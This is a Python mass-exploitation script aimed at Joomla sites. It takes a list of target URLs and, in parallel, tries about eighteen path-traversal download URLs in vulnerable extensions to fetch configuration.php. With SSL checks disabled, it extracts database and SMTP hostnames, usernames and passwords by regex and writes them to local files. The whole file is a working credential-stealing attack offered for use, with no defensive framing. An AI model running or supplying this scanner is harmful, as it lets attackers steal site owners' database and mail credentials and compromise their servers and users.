#!/usr/bin/python3
import requests
import re
import os
from multiprocessing.dummy import Pool
from time import time as timer
import datetime
from urllib.parse import urlparse
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Disable SSL warnings
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Configuration
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
THREADS = 20
TIMEOUT = 10
OUTPUT_DIR = "Res"

# Color definitions
COLOR_INFO = Fore.CYAN + Style.BRIGHT
COLOR_SUCCESS = Fore.GREEN + Style.BRIGHT
COLOR_WARNING = Fore.YELLOW + Style.BRIGHT
COLOR_ERROR = Fore.RED + Style.BRIGHT
COLOR_BANNER = Fore.BLUE + Style.BRIGHT
COLOR_PROGRESS = Fore.BLUE + Style.BRIGHT

def print_banner():
    """Display the colorful tool banner"""
    banner = f"""
{COLOR_BANNER}
  _______ _           _       _      _______    
 |__   __(_)Sel3a    | |9wiya| |    |__   __|   
    | |   _ _ __   __| | __ _| |_The   | |_ __  
    | |  | | '_ \ / _` |/ _` | | | | | | | '_ \ 
    | |  | | | | | (_| | (_| | | |_| |_| | | | |
    |_|  |_|_| |_|\__,_|\__,_|_|\__, (_)_|_| |_|
     Just For Fun!               __/ |          
                                |___/           
                            __                                  __                  
  | _  _ __  |  _    /   __ _  _| _ __ _|_ o  _  |  _    (_  _  _ __ __  _  __
\_|(_)(_)||| | (_|   \__ | (/_(_|(/_| | |_ | (_| | _>    __)(_ (_|| || |(/_ | 

{Style.RESET_ALL}
    """
    print(banner)
    print(f"{COLOR_INFO}Started at: {datetime.datetime.now()}{Style.RESET_ALL}\n")

def create_output_dir():
    """Create output directory if it doesn't exist"""
    if not os.path.exists(OUTPUT_DIR):
        try:
            os.makedirs(OUTPUT_DIR)
            print(f"{COLOR_SUCCESS}[+] Created output directory: {OUTPUT_DIR}{Style.RESET_ALL}")
        except OSError as e:
            print(f"{COLOR_ERROR}[-] Error creating directory: {e}{Style.RESET_ALL}")
            return False
    return True

def get_sites_list(input_file):
    """Read sites from input file with progress indication"""
    print(f"{COLOR_PROGRESS}[*] Reading targets from: {input_file}{Style.RESET_ALL}")
    try:
        with open(input_file, 'r') as f:
            sites = [line.strip() for line in f if line.strip()]
            print(f"{COLOR_SUCCESS}[+] Loaded {len(sites)} targets{Style.RESET_ALL}")
            return sites
    except IOError as e:
        print(f"{COLOR_ERROR}[-] Could not read file: {e}{Style.RESET_ALL}")
        return None

def scan_site(url):
    """Scan a single site for vulnerabilities with progress feedback"""
    results = {
        'url': url,
        'host': None,
        'user': None,
        'password': None,
        'db': None,
        'smtphost': None,
        'smtpuser': None,
        'smtppass': None,
        'smtpport': None,
        'smtpsecure': None,
        'vulnerable': False
    }

    lfi_paths = [
        '/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../configuration.php',
            '/index.php?option=com_cckjseblod&task=download&file=configuration.php',
            '/index.php?option=com_joomanager&controller=details&task=download&path=configuration.php',
            '/administrator/components/com_aceftp/quixplorer/index.php?action=download&dir=&item=configuration.php&order=name&srt=yes',
            '/index.php?option=com_jtagmembersdirectory&task=attachment&download_file=/../../../../configuration.php',
            '/index.php?option=com_macgallery&view=download&albumid=../../configuration.php',
            '/index.php?option=com_facegallery&task=imageDownload&img_name=../../configuration.php',
            '/plugins/content/s5_media_player/helper.php?fileurl=../../../configuration.php',
            '/components/com_docman/dl2.php?archive=0&file=Li4vLi4vLi4vLi4vLi4vLi4vLi4vdGFyZ2V0L3d3dy9jb25maWd1cmF0aW9uLnBocA==',
            '/modules/mod_dvfoldercontent/download.php?f=Li4vLi4vLi4vLi4vLi4vLi4vLi4vdGFyZ2V0L3d3dy9jb25maWd1cmF0aW9uLnBocA==',
            '/index.php?option=com_addproperty&task=listing&propertyId=73&action=filedownload&fname=../configuration.php',
            '/components/com_contushdvideoshare/hdflvplayer/download.php?f=../../../configuration.php',
            '/index.php?option=com_jetext&task=download&file=../../configuration.phF',
            '/index.php?option=com_product_modul&task=download&file=../../../../../configuration.php&id=1&Itemid=1',
            '/plugins/content/wd/wddownload.php?download=wddownload.php&file=../../../configuration.php',
            '/index.php?jat3action=gzip&type=css&file=configuration.php',
            '/index.php?option=com_community&view=groups&groupid=33&task=app&app=groupfilesharing&do=download&file=../../../../configuration.php&Itemid=0',
            '/index.php?option=com_download-monitor&file=configuration.php'
    ]

    for path in lfi_paths:
        try:
            full_url = url + path
            req = requests.get(full_url, 
                             verify=False, 
                             timeout=TIMEOUT,
                             headers={'User-Agent': USER_AGENT})
            
            if req.status_code == 200 and all(x in req.text for x in ["$user", "$host", "$password"]):
                page_content = req.text
                
                # Extract configuration values
                config_values = {
                    'host': safe_extract(r"\$host = '(.*?)'", page_content),
                    'user': safe_extract(r"\$user = '(.*?)'", page_content),
                    'password': safe_extract(r"\$password = '(.*?)'", page_content),
                    'db': safe_extract(r"\$db = '(.*?)'", page_content),
                    'smtphost': safe_extract(r"\$smtphost = '(.*?)'", page_content),
                    'smtpuser': safe_extract(r"\$smtpuser = '(.*?)'", page_content),
                    'smtppass': safe_extract(r"\$smtppass = '(.*?)'", page_content),
                    'smtpport': safe_extract(r"\$smtpport = '(.*?)'", page_content),
                    'smtpsecure': safe_extract(r"\$smtpsecure = '(.*?)'", page_content),
                    'vulnerable': True
                }
                
                results.update(config_values)
                break
                
        except requests.RequestException:
            continue
    
    # Save results if vulnerable
    if results['vulnerable']:
        save_results(results)
        return f"{COLOR_SUCCESS}[+] Vulnerable: {url}{Style.RESET_ALL}"
    else:
        return f"{COLOR_WARNING}[-] Clean: {url}{Style.RESET_ALL}"

def safe_extract(pattern, text):
    """Safely extract first match from text or return None"""
    matches = re.findall(pattern, text)
    return matches[0] if matches else None

def save_results(results):
    """Save results to appropriate files with color indicators"""
    if results['host']:
        save_db_credentials(results)
    if results['smtphost']:
        save_smtp_credentials(results)

def save_db_credentials(results):
    """Save database credentials to file"""
    try:
        with open(f'{OUTPUT_DIR}/database.txt', 'a') as f:
            f.write(f"URL: {results['url']}\n")
            f.write(f"HOST: {results['host']}\n")
            f.write(f"USER: {results['user']}\n")
            f.write(f"PASSWORD: {results['password']}\n")
            f.write(f"DATABASE: {results['db']}\n")
            f.write("="*50 + "\n")
    except IOError as e:
        print(f"{COLOR_ERROR}[-] Error saving DB credentials: {e}{Style.RESET_ALL}")

def save_smtp_credentials(results):
    """Save SMTP credentials to file"""
    try:
        with open(f'{OUTPUT_DIR}/smtp.txt', 'a') as f:
            f.write(f"URL: {results['url']}\n")
            f.write(f"SMTP HOST: {results['smtphost']}\n")
            f.write(f"SMTP USER: {results['smtpuser']}\n")
            f.write(f"SMTP PASS: {results['smtppass']}\n")
            f.write(f"SMTP PORT: {results['smtpport']}\n")
            f.write(f"SMTP SECURE: {results['smtpsecure']}\n")
            f.write("="*50 + "\n")
    except IOError as e:
        print(f"{COLOR_ERROR}[-] Error saving SMTP credentials: {e}{Style.RESET_ALL}")

def main():
    """Main execution function with enhanced UI"""
    print_banner()
    
    if not create_output_dir():
        return
    
    input_file = input(f"{COLOR_INFO}[?] Enter path to sites list: {Style.RESET_ALL}")
    sites = get_sites_list(input_file)
    
    if not sites:
        return
    
    print(f"{COLOR_PROGRESS}[*] Starting scan with {THREADS} threads...{Style.RESET_ALL}")
    
    start_time = timer()
    
    # Process sites with progress feedback
    with Pool(THREADS) as pool:
        results = pool.imap(scan_site, sites)
        for result in results:
            print(result)
    
    # Final summary
    print(f"\n{COLOR_SUCCESS}[+] Scan completed in {timer() - start_time:.2f} seconds{Style.RESET_ALL}")
    
    # Count results
    db_count = 0
    smtp_count = 0
    try:
        with open(f'{OUTPUT_DIR}/database.txt', 'r') as f:
            db_count = len([line for line in f if line.startswith("URL:")])
    except FileNotFoundError:
        pass
        
    try:
        with open(f'{OUTPUT_DIR}/smtp.txt', 'r') as f:
            smtp_count = len([line for line in f if line.startswith("URL:")])
    except FileNotFoundError:
        pass
    
    print(f"{COLOR_INFO}[*] Found {db_count} database configurations{Style.RESET_ALL}")
    print(f"{COLOR_INFO}[*] Found {smtp_count} SMTP configurations{Style.RESET_ALL}")
    print(f"{COLOR_SUCCESS}[+] Results saved in '{OUTPUT_DIR}' directory{Style.RESET_ALL}")

if __name__ == '__main__':
    main()